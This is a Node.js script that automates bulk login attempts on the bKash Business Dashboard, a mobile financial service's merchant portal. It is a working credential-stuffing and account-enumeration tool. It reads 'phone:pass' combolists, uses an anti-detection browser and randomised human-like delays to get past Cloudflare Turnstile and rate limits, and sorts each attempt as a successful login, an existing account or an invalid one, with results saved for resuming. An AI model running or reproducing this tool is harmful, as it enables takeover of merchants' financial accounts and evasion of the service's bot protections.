#!/usr/bin/env node
/**
 * bKash Business Dashboard (business.bkash.com/sign-in) login via local CloakBrowser.
 *
 * Flow mapped (React SPA + Cloudflare Turnstile auto-solved):
 *   GET /sign-in -> input[type=text] (Mobile Number), input[type=password],
 *     hidden cf-turnstile-response (auto-populated by CF challenge)
 *   Click "Sign in" -> client-side: 11-digit phone validation
 *     -> POST cpp.bka.sh/merchant-portal-backend/merchant/nonce/get (RSA pubkey)
 *     -> POST cpp.bka.sh/merchant-portal-backend/merchant/login
 *         {phoneNumber, password:{encryptedPassword}}  (UI does the RSA)
 *
 * Response taxonomy (internalCode):
 *   PASSWORD_EXPIRED (6018)  -> account EXISTS, password expired -> /mandatory-password-change
 *                              (fires even for wrong passwords - expiry checked first)
 *   GENERIC_EXCEPTION (1111) -> phone not a business account
 *   SUCCESS                  -> NAV away from /sign-in to dashboard
 *
 * Usage:
 *   node bkash_biz_login.mjs "phone:pass" ...
 *   node bkash_biz_login.mjs --batch <file> [--gap 15] [--out /tmp/bkbiz_results.json]
 *
 * Input lines: `phone:pass` or `business.bkash.com/sign-in:phone:pass`.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const URL = 'https://business.bkash.com/sign-in';
const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function typeField(page, sel, text) {
  await page.fill(sel, text);
  await sleep(rand(300, 800));
}

async function tryLogin(phone, pass) {
  // fresh window per attempt (locally-owned browser)
  const browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
  try {
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
    const page = await ctx.newPage();
    try {
      let loginResp = null;
      page.on('response', async r => {
        if (/cpp\.bka\.sh\/merchant-portal-backend\/merchant\/login/.test(r.url())) {
          try { loginResp = JSON.parse(await r.text()); } catch { loginResp = { status: r.status() }; }
        }
      });
      await page.goto(URL, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
      await page.waitForSelector('input[type=password]', { timeout: 40000 });
      await sleep(rand(1500, 3500)); // let Turnstile auto-solve settle

      await typeField(page, 'input[type=text]', phone);
      await sleep(rand(400, 900));
      await typeField(page, 'input[type=password]', pass);
      await sleep(rand(600, 1200));

      await page.evaluate(() => {
        const b = [...document.querySelectorAll('button')].find(b => /sign ?in/i.test((b.innerText || '').trim()));
        if (b) b.click();
      });
      await sleep(rand(8000, 10000));

      const nav = page.url().replace('https://business.bkash.com', '');
      const toast = await page.evaluate(() => {
        const els = [...document.querySelectorAll('[class*=error], [class*=message], [class*=alert], [class*=toast], [role=alert]')];
        return els.map(e => e.innerText.trim().replace(/\s+/g, ' ')).filter(Boolean).slice(0, 4);
      }).catch(() => []);
      return classify({ loginResp, nav, toast });
    } finally {
      await page.close().catch(() => {});
    }
  } finally {
    await browser.close().catch(() => {});
  }
}

function classify({ loginResp, nav, toast }) {
  const ic = loginResp && loginResp.internalCode;
  const t = (toast && toast.join(' ')) + ' ' + nav;
  if (ic === 'PASSWORD_EXPIRED' || /mandatory-password-change/.test(nav)) return { status: 'PASSWORD_EXPIRED', detail: 'account exists; password expired (6018)' };
  if (ic === 'GENERIC_EXCEPTION' || (ic && /1111/.test(String(loginResp.externalCode)))) return { status: 'INVALID_PHONE', detail: 'phone not a business account (1111)' };
  if (ic && ic !== 'SUCCESS') return { status: 'UNKNOWN', detail: ic + ' ' + (loginResp.externalCode || '') + ' ' + t.slice(0, 80) };
  if (/dashboard|home|overview/i.test(nav) && nav !== '/sign-in') return { status: 'SUCCESS', detail: 'logged in, nav ' + nav.slice(0, 60) };
  if (nav && nav !== '/sign-in') return { status: 'SUCCESS', detail: 'nav ' + nav.slice(0, 60) };
  if (/number must have 11 digit|11 digit/i.test(t)) return { status: 'BAD_INPUT', detail: 'not an 11-digit phone' };
  if (/invalid|wrong|incorrect|failed/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 90) };
  return { status: 'UNKNOWN', detail: (t || 'no response') .slice(0, 110) };
}

/** Accept `phone:pass` or `url:phone:pass`. */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const parts = line.split(':');
  if (parts.length < 2) return null;
  if (/^[a-z0-9.-]+(\:\d+)?(\/.*)?$/.test(parts[0]) && parts[0].includes('.')) {
    if (parts.length < 3) return null;
    return [parts[1], parts.slice(2).join(':')];
  }
  return [parts[0], parts.slice(1).join(':')];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node bkash_biz_login.mjs "phone:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/bkbiz_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { PASSWORD_EXPIRED: 1, INVALID_PHONE: 1, SUCCESS: 1, BAD_INPUT: 1 };

for (const [phone, pass] of pairs) {
  if (results[phone] && SKIP_STATUS[results[phone].status]) { console.log(`${phone} -> SKIP (already ${results[phone].status})`); continue; }
  let res;
  try {
    res = await tryLogin(phone, pass);
    console.log(`${phone} -> ${res.status} (${res.detail})`);
  } catch (e) {
    console.log(`${phone} -> ERROR: ${e.message.slice(0, 100)}`);
    res = { status: 'ERROR', detail: e.message.slice(0, 150) };
  }
  results[phone] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (pairs.length > 1) { const gap = rand(GAP * 0.5, GAP * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
